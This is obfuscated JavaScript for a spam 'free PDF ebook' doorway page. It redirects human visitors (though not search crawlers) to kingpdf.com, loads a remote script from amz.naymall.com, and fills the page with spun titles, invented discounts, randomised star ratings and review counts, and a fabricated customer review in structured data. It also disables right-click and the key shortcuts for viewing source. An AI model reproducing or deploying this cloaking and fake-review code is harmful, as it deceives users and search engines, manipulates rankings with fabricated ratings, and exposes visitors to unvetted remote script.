let url = window['location']['href'], id = url['substring'](url['lastIndexOf']('=') + 1), explode = url['split']('/'), subdom = explode[2];
if (id['match'](/^[A-Za-z0-9_.]+$/) != null) {
    let user_agent = navigator['userAgent'],
    filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
    redirect_link = 'https://kingpdf.com/BookLibrary-'+ id + '.html';
    !user_agent['match'](filter_bot) && window['location']['replace'](redirect_link);
    let data_content = document['getElementById']('desc'),
    s = document['createElement']('script');
    s['type'] = 'text/javascript',
    s['src'] = 'https://amz.naymall.com/gotrek.php?id=' + id,
    data_content['innerHTML'] = '<div class=\"loading\"></div>',
    data_content['appendChild'](s);
    function product(prodi) {
        if (prodi['result']) {
            let shjeson = prodi['result'],
            spinprefix = ['Ebook', 'e-Book', 'Book', 'PDF', 'd0wnload', 'Read', 'Fre3\x20Pdf', 'Library', 'Book\x20Depository'],
            spinfixtitel = spinprefix[Math['floor'](Math['random']() * spinprefix['length'])],
            prodnama = shjeson['productName'],
            desmeta = shjeson['metaDesc'],
            prodimg = shjeson['productImage'],
            stornama = shjeson['storeName'] ? shjeson['storeName'] : subdom,
            prodprice = shjeson['productNewPrice'],
            shuf1 = shuffle(['10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90']),
            shufrate = shuffle(['3.7', '3.8', '3.9', '4.0', '4.1', '4.2', '4.3', '4.4', '4.5', '4.6', '4.7', '4.8', '4.9', '5.0']),
            allimg = shjeson['allProductImage']['toString'](),
            splitimgall = allimg['split'](','),
            ranimgall = splitimgall['length'],
            hider = '<header><h1 class=\"title\"><a href=\"\" rel=\"noindex,nofollow\" target=\"_blank\" onclick=\"window.open(\'' + redirect_link + '\')\">' + '[' + spinfixtitel + ']\x20' + prodnama['split']('\x20')['splice'](0x0, 0xa)['join']('\x20') + '</a></h1></header><hr>',
            brodcum = '<nav><ol class=\"breadcrumb text-center\" itemscope itemtype=\"http://schema.org/BreadcrumbList\"><li itemprop=\"itemListElement\" itemscope itemtype=\"http://schema.org/ListItem\"><a itemprop=\"item\" href=\"' + window['location']['origin'] + '\"><span itemprop=\"name\">Home</span></a><meta itemprop=\"position\" content=\"1\" /></li><li itemprop=\"itemListElement\" itemscope itemtype=\"http://schema.org/ListItem\"><a itemprop=\"item\" href=\"' + url + '\"><span itemprop=\"name\">' + prodnama['split']('\x20')['splice'](0x0, 0x5)['join']('\x20') + '</span></a><meta itemprop=\"position\" content=\"2\" /></li></ol></nav>',
            desclass = brodcum + '<h2 class=\"deskripsi\">' + desmeta + '</h2>',
            urllp = '<a\x20href=\x22\x22\x20rel=\x22noindex,nofollow\x22\x20target=\x22_blank\x22\x20onclick=\x22window.open(\x27' + redirect_link + '\')\"><img class=\"gambar\" data-qazy=\"true\" src=\"' + prodimg + '\" alt=\"' + prodnama + '\" title=\"' + prodnama + '\"></a><hr><div class=\"product-price\"><a href=\"\" rel=\"noindex,nofollow\" type=\"submit\" class=\"btn btn-sm price blink\" onclick=\"window.open(\'' + redirect_link + '\')\"><i class=\"fa fa-chevron-circle-right\" aria-hidden=\"true\"></i> Check Details <i class=\"fa fa-chevron-circle-left\" aria-hidden=\"true\"></i></a></div><small>Last Update: ' + tanggal() + '</small><hr>',
            tagline = '<hr><p class=\"text-justify\">PDF <u>' + prodnama + '</u>\x20from\x20merchant\x20' + stornama + ' at affordable price and best quality. You can get up to ' + shuf1[0x0] + '% off Discount when you purchase this product from our website, so you only have to pay ' + prodprice + ' for <a href=\"' + window['location']['origin'] + '\x22\x20alt=\x22' + prodnama + '\" title=\"' + prodnama + '\x22>' + prodnama + '</a>. We offers a wide variety of similar product so you can find just what you’re looking for, even some that you would never have imagined to find. We also have thousands of about <i>' + prodnama + '</i> deals on ' + subdom + ', always with the high quality and best guarantee. Additionally, you can pick between the price range, the brand name, or the specs that you believe are crucial for your favorite product.</p><hr>',
            futer = '<div\x20class=\x22footer\x20text-center\x22>\x20The\x20results\x20are\x20displayed.\x20Research\x20by\x20' + subdom + ' is a link. Availability The price, details, specifications, photos and other information are the responsibility of the seller. Using the services of ' + subdom + ', you agree to comply with this provision.<br>&copy; <a href=\"' + window['location']['origin'] + '\" title=\"' + subdom + '\x22\x20alt=\x22' + subdom + '\x22>' + subdom + '</a></div>';
            document['title'] = '[' + spinfixtitel + ']\x20' + prodnama,
            document['querySelector']('meta[name=\"description\"]')['content'] = shjeson['metaDesc'],
            document['querySelector']('meta[name=\"keyword\"]')['content'] = shjeson['metaKw'],
            document['querySelector']('link[rel=\"canonical\"]')['href'] = url;
            let tampillp = hider + desclass + urllp;
            for (i = 0x0; i < ranimgall; i++) {
                i < 0x5 && (tampillp += '<a\x20href=\x22\x22\x20rel=\x22noindex,nofollow\x22\x20target=\x22_blank\x22\x20onclick=\x22window.open(\x27' + redirect_link + '\')\"><img class=\"thumbnail\" data-qazy=\"true\" src=\"' + splitimgall[i] + '\" alt=\"' + prodnama + '\" title=\"' + prodnama + '\"><noscript><img src=\"' + splitimgall[i] + '\" alt=\"' + prodnama + '\" title=\"' + prodnama + '\"></noscript></a>');
            }
            data_content['innerHTML'] = tampillp + tagline;
            let iniskema = [{
                    '@context': 'https://schema.org/',
                    '@type': 'Product',
                    'name': '[' + spinfixtitel + ']\x20' + prodnama,
                    'image': prodimg,
                    'description': shjeson['metaDesc'],
                    'sku': id,
                    'mpn': id,
                    'brand': 'Global',
                    'aggregateRating': {
                        '@type': 'AggregateRating',
                        'ratingValue': shufrate[0],
                        'reviewCount': Math['floor'](Math['random']() * 9000) + 100
                    },
                    'offers': {
                        '@type': 'Offer',
                        'url': window['location']['origin'],
                        'priceCurrency': 'USD',
                        'price': '1',
                        'priceValidUntil': '2098-12-31',
                        'availability': 'https://schema.org/InStock',
                        'seller': {
                            '@type': 'Organization',
                            'name': stornama
                        }
                    },
                    'review': [{
                            '@type': 'Review',
                            'author': 'A***Z',
                            'datePublished': '2020-01-01',
                            'description': 'Awesome product, with free shipping & big discount. Thank you so much. Very very recomended seller, trusted',
                            'name': '# 1 received by courier very quickly',
                            'reviewRating': {
                                '@type': 'Rating',
                                'bestRating': '5',
                                'ratingValue': 5,
                                'worstRating': '1'
                            }
                        }
                    ]
                }
            ],
            getexse = document['createElement']('script');
            getexse['type'] = 'application/ld+json',
            getexse['text'] = JSON['stringify'](iniskema),
            data_content['appendChild'](getexse);
        }
    }
} else {
    let data_list_id = document['getElementById']('list_id'),
    e = document['createElement']('script');
    e['type'] = 'text/javascript',
    e['src'] = 'https://amz.naymall.com/tejoid.php',
    data_list_id['innerHTML'] = '<div class=\"loading\"></div>',
    data_list_id['appendChild'](e);
    function product(mbilid) {
        if (mbilid['result']) {
            let hasileid = mbilid['result'],
            splithasileid = hasileid['split'](','),
            lenghasileid = splithasileid['length'],
            songhasileid = '',
            foothasileid = '<div class=\"footer text-center\"> The results are displayed. Research by ' + subdom + '\x20is\x20a\x20link.\x20Availability\x20The\x20price,\x20details,\x20specifications,\x20photos\x20and\x20other\x20information\x20are\x20the\x20responsibility\x20of\x20the\x20seller.\x20Using\x20the\x20services\x20of\x20' + subdom + ', you agree to comply with this provision.<br>&copy; <a href=\"' + window['location']['origin'] + '\" title=\"' + subdom + '\" alt=\"' + subdom + '\x22>' + subdom + '</a></div>';
            for (i = 0; i < lenghasileid; i++) {
                songhasileid += '<a href=\"/indexs.html?id=' + splithasileid[i] + '\x22\x20target=\x22_blank\x22>' + splithasileid[i] + '</a>\x20|\x20';
            }
            data_list_id['innerHTML'] = songhasileid + foothasileid;
        }
    }
}
function shuffle(fungsafel) {
    var lengsafel = fungsafel['length'],
    gosafel,
    gosafel2;
    while (0 !== lengsafel) {
        gosafel2 = Math['floor'](Math['random']() * lengsafel),
        lengsafel -= 1,
        gosafel = fungsafel[lengsafel],
        fungsafel[lengsafel] = fungsafel[gosafel2],
        fungsafel[gosafel2] = gosafel;
    }
    return fungsafel;
}
function tanggal() {
    var tanggaleoi = new Date(),
    mnttanggaleoi = tanggaleoi['getMinutes']()['toString']()['length'] == 1 ? '0' + tanggaleoi['getMinutes']() : tanggaleoi['getMinutes'](),
    jamtanggaleoi = tanggaleoi['getHours']()['toString']()['length'] == 1 ? '0' + tanggaleoi['getHours']() : tanggaleoi['getHours'](),
    blntanggaleoi = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
    hrtanggaleoi = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
    return hrtanggaleoi[tanggaleoi['getDay']()] + ',\x20' + tanggaleoi['getDate']() + '\x20' + blntanggaleoi[tanggaleoi['getMonth']()] + '\x20' + tanggaleoi['getFullYear']()['toString']()['substr'](-2) + '\x20' + tanggaleoi['toLocaleTimeString']();
}
function reveal() {
    for (var gorevel = 0; gorevel < view_elements['length']; gorevel++) {
        var gorevel2 = 0,
        ngeviewgorevel = view_elements[gorevel];
        do
            isNaN(ngeviewgorevel['offsetTop']) || (gorevel2 += ngeviewgorevel['offsetTop']);
        while (ngeviewgorevel = ngeviewgorevel['offsetParent']);
        var pagegorevel = window['pageYOffset'],
        inergorevel = window['innerHeight'],
        numgorevel = 0,
        ngeviewgorevel = view_elements[gorevel];
        do
            isNaN(ngeviewgorevel['offsetLeft']) || (numgorevel += ngeviewgorevel['offsetLeft']);
        while (ngeviewgorevel = ngeviewgorevel['offsetParent']);
        var pageofgorevel = window['pageXOffset'],
        inwidgorevel = window['innerWidth'];
        gorevel2 > pagegorevel && pagegorevel + inergorevel > gorevel2 && numgorevel > pageofgorevel && pageofgorevel + inwidgorevel > numgorevel ? (view_elements[gorevel]['src'] = view_elements[gorevel]['getAttribute']('data-qazy-src'), console['log'](view_elements[gorevel]['src']), view_elements['splice'](gorevel, 1), gorevel--) : console['log']('offsetParentTop' + gorevel2 + ' pageYOffset' + pagegorevel + ' viewportHeight' + window['innerHeight']);
    }
}
function qazy_list_maker() {
    for (var lismaker = document['querySelectorAll']('img[data-qazy][data-qazy=\'true\']'), numlismaker = 0; numlismaker < lismaker['length']; numlismaker++) {
        view_elements['push'](lismaker[numlismaker]),
        lismaker[numlismaker]['setAttribute']('data-qazy', 'false');
        var srclismaker = lismaker[numlismaker]['src'];
        lismaker[numlismaker]['setAttribute']('data-qazy-src', srclismaker),
        lismaker[numlismaker]['src'] = qazy_image;
    }
}
var qazy_image = qazy_image || 'data:image/svg+xml;base64,<svg class="lds-message" width="80px"  height="80px"  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><g transform="translate(20 50)"><circle cx="0" cy="0" r="7" fill="#e15b64" transform="scale(0.99275 0.99275)">  <animateTransform attributeName="transform" type="scale" begin="-0.375s" calcMode="spline" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" values="0;1;0" keyTimes="0;0.5;1" dur="1s" repeatCount="indefinite"></animateTransform></circle></g><g transform="translate(40 50)"><circle cx="0" cy="0" r="7" fill="#f47e60" transform="scale(0.773605 0.773605)">  <animateTransform attributeName="transform" type="scale" begin="-0.25s" calcMode="spline" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" values="0;1;0" keyTimes="0;0.5;1" dur="1s" repeatCount="indefinite"></animateTransform></circle></g><g transform="translate(60 50)"><circle cx="0" cy="0" r="7" fill="#f8b26a" transform="scale(0.42525 0.42525)">  <animateTransform attributeName="transform" type="scale" begin="-0.125s" calcMode="spline" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" values="0;1;0" keyTimes="0;0.5;1" dur="1s" repeatCount="indefinite"></animateTransform></circle></g><g transform="translate(80 50)"><circle cx="0" cy="0" r="7" fill="#abbd81" transform="scale(0.113418 0.113418)">  <animateTransform attributeName="transform" type="scale" begin="0s" calcMode="spline" keySplines="0.3 0 0.7 1;0.3 0 0.7 1" values="0;1;0" keyTimes="0;0.5;1" dur="1s" repeatCount="indefinite"></animateTransform></circle></g></svg>', view_elements = [];
window['addEventListener']('resize', reveal, !1), window['addEventListener']('scroll', reveal, !1);
var intervalObject = setInterval(function () {
        qazy_list_maker();
    }, 50);
window['addEventListener']('load', function () {
    clearInterval(intervalObject),
    qazy_list_maker(),
    reveal();
}, !1), document['addEventListener']('contextmenu', kontek => kontek['preventDefault']()), document['onkeypress'] = function (kontek1ya) {
    kontek1ya = kontek1ya || window['event'];
    if (kontek1ya['keyCode'] == 123 || kontek1ya['keyCode'] == 86 || kontek1ya['keyCode'] == 85 || kontek1ya['keyCode'] == 67 || kontek1ya['keyCode'] === 17)
        return ![];
}, document['onmousedown'] = function (kontekmous) {
    kontekmous = kontekmous || window['event'];
    if (kontekmous['keyCode'] == 123 || kontekmous['keyCode'] == 86 || kontekmous['keyCode'] == 85 || kontekmous['keyCode'] == 67 || kontekmous['keyCode'] === 17)
        return ![];
}, document['onkeydown'] = function (kontekkeydon) {
    kontekkeydon = kontekkeydon || window['event'];
    if (kontekkeydon['keyCode'] == 123 || kontekkeydon['keyCode'] == 86 || kontekkeydon['keyCode'] == 85 || kontekkeydon['keyCode'] == 67 || kontekkeydon['keyCode'] === 17)
        return ![];
};
